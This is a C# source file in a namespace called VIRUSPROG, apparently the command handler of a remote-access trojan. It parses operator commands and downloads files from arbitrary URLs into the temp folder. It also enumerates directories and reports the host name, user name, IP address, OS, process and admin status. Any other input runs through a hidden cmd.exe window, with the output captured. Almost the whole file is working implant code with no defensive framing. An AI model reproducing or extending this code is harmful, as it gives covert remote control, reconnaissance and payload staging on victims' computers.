using System;
using System.Linq;

namespace VIRUSPROG
{
    class Operations
    {
        private string currentDirectory;

        GeneralInfo ninstace=new GeneralInfo();

        public Operations(GeneralInfo instance){
            ninstace=instance;
            currentDirectory = instance.cDirectory;

        }
        public string CommandParser(string cmd){//Command parsing and running
            string argument = "";
            //Download url
            string command;
            if (cmd.Contains(" "))
            {//iF The command contains a space
                command = cmd.Split(" ")[0];
                argument = cmd.Split(" ")[1];

            }
            else
            {//else
                command = cmd;
            }

            if (command.Contains("download")){
                return DownloadFile(argument);
            }
            else if(command.Contains("cd")){
                return SetWorkingDirectory(argument);
            }
            else if(command.Contains("ls")){
                
                return EnumWorkingDirectory(argument);
            }
            else if(command.Contains("hostname")){
                return GetHostName();
            }
            else if(command.Contains("osinfo")){
                return GetOsInfo();
            }
            else if(command.Contains("username")){
                return GetUserName();
            }
            else if(command.Contains("processinfo")){
                return GetProcessInfo();
            }
            else if(command.Contains("pwd" )){
                return GetWorkingDirectory();
            }
            else if(command.Contains("ipaddress")){
                return GetIpv4Address();
            }
            else if(command.Contains("privileges")){
                return IsAdmin();
            }
            else if(command.Contains("exepath")){
                return GetExePath(); 
            }
            else{
                return ExecuteCMD(cmd);
            }
        }
        public string DownloadFile(string url){
            try{
            System.Net.WebClient winstance=new System.Net.WebClient();
            string tempPath=System.IO.Path.GetTempPath();
            string fileName=url.Split('/')[url.Split('/').Length -1];
            string savePath= tempPath+fileName;

            winstance.DownloadFile(url,savePath);
            return "File has been downloaded to: "+savePath;
            }
            catch(Exception e){
                return e.Message.ToString();
            }
        }

        public string SetWorkingDirectory(string path){
            try{
                Console.WriteLine("Current directory before change: " + currentDirectory); // Debugging output
                Console.WriteLine("Changing directory to: " + path); // Debugging output
                System.IO.Directory.SetCurrentDirectory(path);
                currentDirectory = System.IO.Directory.GetCurrentDirectory(); // Update current directory
                Console.WriteLine("Current directory after change: " + currentDirectory); // Debugging output
                return "Directory has been changed to: " + currentDirectory;
            }
            catch(Exception e){
                return "Error changing directory: " + e.Message.ToString();
            }
        }



        public string EnumWorkingDirectory(string path){
            try{
                if(path ==""){
                    path=currentDirectory;
                }
            System.Text.StringBuilder sbInstance=new System.Text.StringBuilder();
            var dirs=from line in System.IO.Directory.EnumerateDirectories(path) select line;
            foreach(var dir in dirs){
                sbInstance.Append(dir);
                sbInstance.Append(Environment.NewLine);
            }
            string enumratedDirectory=sbInstance.ToString();
            // c:\Windows
            // c:\Program Files

            var files=from line in System.IO.Directory.EnumerateFiles(path) select line;
            foreach(var file in files){
                sbInstance.Append(file);
                sbInstance.Append(Environment.NewLine);
            }
            string DirsAndFiles=sbInstance.ToString();
            
            return DirsAndFiles;
            }

            catch(Exception e){
                return (e.Message.ToString());
            }
        
        }

        public string ExecuteCMD(string command){
            try{
            string results= " ";

            System.Diagnostics.Process pInstance=new System.Diagnostics.Process();
            pInstance.StartInfo.FileName="cmd.exe";
            pInstance.StartInfo.Arguments="/c "+command;
            pInstance.StartInfo.UseShellExecute=false;
            pInstance.StartInfo.CreateNoWindow=true;
            pInstance.StartInfo.WorkingDirectory=currentDirectory;
            pInstance.StartInfo.RedirectStandardOutput=true;
            pInstance.StartInfo.RedirectStandardError=true;
            pInstance.Start();
            Console.WriteLine(pInstance.StartInfo.WorkingDirectory);
            results+=pInstance.StandardOutput.ReadToEnd();
            results+=pInstance.StandardError.ReadToEnd();

            return results;
            }
            catch(Exception e){
                return (e.Message.ToString());
            }
        }

        public string GetHostName(){return ninstace.hostName;}
        public string GetUserName(){return ninstace.uName;}
        public string GetIpv4Address(){return ninstace.ipv4Address;}
        public string GetProcessInfo(){return ninstace.pName+" "+ninstace.pId;}
        public string IsAdmin(){return ninstace.isAdmin.ToString();}
        public string GetWorkingDirectory(){return currentDirectory;}
        public string GetExePath(){return ninstace.ePath;}
        public string GetOsInfo(){return ninstace.oSystem;}

    }
}